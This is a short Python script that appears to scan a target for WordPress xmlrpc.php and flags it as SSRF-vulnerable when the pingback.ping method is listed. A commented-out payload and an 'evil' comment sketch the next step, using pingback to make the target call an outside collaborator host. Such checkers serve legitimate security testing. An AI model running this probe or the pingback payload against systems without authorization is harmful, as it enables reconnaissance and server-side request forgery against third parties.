#!/usr/bin/python
import requests
import sys
from termcolor import colored
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#print(colored('This is xmlrpc SSRF - XSPA checker', 'yellow'))
#print(colored('Software used for detect xmlrpc.php on target(1st argument) and send SSRF request to collaboratorhost(2nd argument)', 'yellow'))
#print(colored('Example: python xmlrpcfinder.py http://target.com collaboratorhost.com', 'yellow'))

xml = """<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>"""

#to-do: pingback.ping exploitation with collaborator
# xml2 = """<?xml version="1.0" encoding="UTF-8"?>
# <methodCall>
# <methodName>pingback.ping</methodName>
# <params>
# <param>
# <value><string>"""+sys.argv[1]+"""</string></value>
# </param>
# <param>
# <value><string>"""+sys.argv[2]+"""</string></value>
# </param>
# </params>
# </methodCall>"""

url = sys.argv[1]
headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '131'} # set what your server accepts
try:
	r = requests.post(url, data=xml, headers=headers, verify=False)
	if 'pingback.ping' in r.content:
		print(colored("[+] - "+url+" - seems vulnerable!", 'green'))
		#print(colored("Let's do some evil now!", 'green'))
		# r = requests.post(url, data=xml2, headers=headers, verify=False)
		# print(r.content)
	else:
		print(colored("[-] - "+url+" - not vulnerable!", 'red'))
except requests.exceptions.ConnectionError:
    requests.status_code = "Connection refused"
